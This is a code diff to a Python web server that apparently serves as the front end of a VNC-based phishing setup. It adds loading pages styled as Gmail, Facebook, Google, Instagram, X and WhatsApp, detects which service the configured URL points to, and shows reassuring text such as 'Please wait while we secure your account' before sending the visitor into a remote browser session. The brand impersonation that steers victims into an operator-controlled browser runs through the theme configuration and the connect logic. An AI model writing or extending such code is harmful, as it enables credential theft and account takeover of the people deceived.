@@ -449,7 +449,7 @@ ROUTER_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connecting...</title>
+    <title>Loading...</title>
     <style>
         * {
             margin: 0;
@@ -459,22 +459,76 @@ ROUTER_HTML = """
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #fff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: background 0.3s;
         }
+
+        /* Theme: Generic */
+        body.theme-generic {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+        }
+
+        /* Theme: Gmail */
+        body.theme-gmail {
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            color: #202124;
+        }
+        .theme-gmail .spinner { border-top-color: #ea4335; }
+        .theme-gmail .logo { color: #ea4335; }
+
+        /* Theme: Facebook */
+        body.theme-facebook {
+            background: linear-gradient(135deg, #1877f2 0%, #0d5bbd 100%);
+            color: #fff;
+        }
+        .theme-facebook .spinner { border-top-color: #fff; border-color: rgba(255,255,255,0.2); }
+
+        /* Theme: Google */
+        body.theme-google {
+            background: #fff;
+            color: #202124;
+        }
+        .theme-google .spinner { border-top-color: #4285f4; }
+
+        /* Theme: Instagram */
+        body.theme-instagram {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: #fff;
+        }
+        .theme-instagram .spinner { border-top-color: #fff; border-color: rgba(255,255,255,0.2); }
+
+        /* Theme: Twitter/X */
+        body.theme-twitter {
+            background: #000;
+            color: #fff;
+        }
+        .theme-twitter .spinner { border-top-color: #1d9bf0; }
+
+        /* Theme: WhatsApp */
+        body.theme-whatsapp {
+            background: linear-gradient(135deg, #128c7e 0%, #075e54 100%);
+            color: #fff;
+        }
+        .theme-whatsapp .spinner { border-top-color: #25d366; border-color: rgba(255,255,255,0.2); }
 
         .loader {
             text-align: center;
+            padding: 20px;
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
         }
 
         .spinner {
             width: 50px;
             height: 50px;
-            border: 3px solid rgba(255,255,255,0.1);
+            border: 3px solid rgba(0,0,0,0.1);
             border-top-color: #0a84ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
@@ -486,46 +540,142 @@ ROUTER_HTML = """
         }
 
         h1 {
-            font-size: 24px;
+            font-size: 20px;
+            font-weight: 500;
             margin-bottom: 10px;
         }
 
         p {
-            color: rgba(255,255,255,0.6);
+            opacity: 0.7;
             font-size: 14px;
         }
 
         .error {
             color: #ff453a;
             margin-top: 20px;
+            opacity: 1;
+        }
+
+        /* Logo images */
+        .logo-img {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
-<body>
+<body class="theme-generic">
     <div class="loader">
+        <div class="logo" id="logo">🌐</div>
         <div class="spinner"></div>
-        <h1>Setting up your session...</h1>
-        <p>Please wait while we prepare your workspace</p>
+        <h1 id="title">Loading...</h1>
+        <p id="subtitle">Please wait</p>
         <p id="error" class="error" style="display:none;"></p>
     </div>
 
     <script>
-        async function connect() {
-            const params = new URLSearchParams(window.location.search);
-            const vnc_file = params.get('vnc') || 'vnc.html';
-            const url = params.get('url') || '';
+        // Site themes configuration
+        const themes = {
+            gmail: {
+                theme: 'gmail',
+                logo: '✉️',
+                title: 'Please wait while we secure your account',
+                subtitle: 'Connecting to Gmail...'
+            },
+            facebook: {
+                theme: 'facebook',
+                logo: 'f',
+                title: 'Please wait while we connect you',
+                subtitle: 'Loading Facebook...'
+            },
+            google: {
+                theme: 'google',
+                logo: 'G',
+                title: 'Loading Google',
+                subtitle: 'Just a moment...'
+            },
+            instagram: {
+                theme: 'instagram',
+                logo: '📷',
+                title: 'Please wait',
+                subtitle: 'Loading Instagram...'
+            },
+            twitter: {
+                theme: 'twitter',
+                logo: '𝕏',
+                title: 'Loading',
+                subtitle: 'Connecting to X...'
+            },
+            x: {
+                theme: 'twitter',
+                logo: '𝕏',
+                title: 'Loading',
+                subtitle: 'Connecting to X...'
+            },
+            whatsapp: {
+                theme: 'whatsapp',
+                logo: '💬',
+                title: 'Please wait',
+                subtitle: 'Loading WhatsApp Web...'
+            }
+        };
+
+        function detectSite(url) {
+            if (!url) return null;
+            url = url.toLowerCase();
             
+            if (url.includes('gmail') || url.includes('mail.google')) return 'gmail';
+            if (url.includes('facebook') || url.includes('fb.com')) return 'facebook';
+            if (url.includes('instagram')) return 'instagram';
+            if (url.includes('twitter') || url.includes('x.com')) return 'twitter';
+            if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'whatsapp';
+            if (url.includes('google')) return 'google';
+            
+            return null;
+        }
+
+        function applyTheme(url) {
+            const site = detectSite(url);
+            
+            if (site && themes[site]) {
+                const config = themes[site];
+                document.body.className = 'theme-' + config.theme;
+                document.getElementById('logo').textContent = config.logo;
+                document.getElementById('title').textContent = config.title;
+                document.getElementById('subtitle').textContent = config.subtitle;
+            } else if (url) {
+                // Generic theme with site name
+                try {
+                    const hostname = new URL(url).hostname.replace('www.', '');
+                    document.getElementById('title').textContent = 'Loading ' + hostname;
+                    document.getElementById('subtitle').textContent = 'Please wait...';
+                } catch(e) {
+                    document.getElementById('title').textContent = 'Loading...';
+                }
+            }
+        }
+
+        async function connect() {
             try {
+                // First get the configured URL from server
+                const configResponse = await fetch('/api/config');
+                const config = await configResponse.json();
+                
+                // Apply theme based on URL
+                if (config.url) {
+                    applyTheme(config.url);
+                }
+                
+                // Now connect
                 const response = await fetch('/api/connect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ vnc_file, url })
+                    body: JSON.stringify({})
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    // Redirect to the session's keyboard page
                     window.location.href = data.redirect_url;
                 } else {
                     document.getElementById('error').textContent = data.error || 'Failed to create session';
@@ -583,6 +733,23 @@ KEYBOARD_WRAPPER_HTML = """
 # REQUEST HANDLER
 # ============================================
 
+# Global config for current session settings
+_server_config = {
+    'url': '',
+    'vnc_file': 'vnc.html'
+}
+
+def set_server_config(url='', vnc_file='vnc.html'):
+    """Set the server config (called from launcher)"""
+    global _server_config
+    _server_config['url'] = url
+    _server_config['vnc_file'] = vnc_file
+
+def get_server_config():
+    """Get current server config"""
+    return _server_config.copy()
+
+
 class AdminHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass  # Suppress default logging
@@ -626,6 +793,9 @@ class AdminHandler(BaseHTTPRequestHandler):
         elif path == '/connect':
             self.send_html(ROUTER_HTML)
         
+        elif path == '/api/config':
+            self.send_json(get_server_config())
+        
         elif path == '/api/sessions':
             sessions = manager.get_all_sessions()
             stats = manager.get_stats()
@@ -660,20 +830,13 @@ class AdminHandler(BaseHTTPRequestHandler):
         client_ip = self.get_client_ip()
         
         if path == '/api/connect':
-            # Read request body
-            content_length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(content_length).decode() if content_length > 0 else '{}'
-            
-            try:
-                data = json.loads(body)
-            except:
-                data = {}
-            
-            vnc_file = data.get('vnc_file', 'vnc.html')
-            url = data.get('url', '')
+            # Get config from server settings
+            config = get_server_config()
+            vnc_file = config.get('vnc_file', 'vnc.html')
+            url = config.get('url', '')
             
             # Create or get session
-            session = manager.create_session(client_ip, vnc_file, url)
+            session = manager.create_session(client_ip, vnc_file, url if url else None)
             
             if session:
                 host = self.headers.get('Host', 'localhost').split(':')[0]
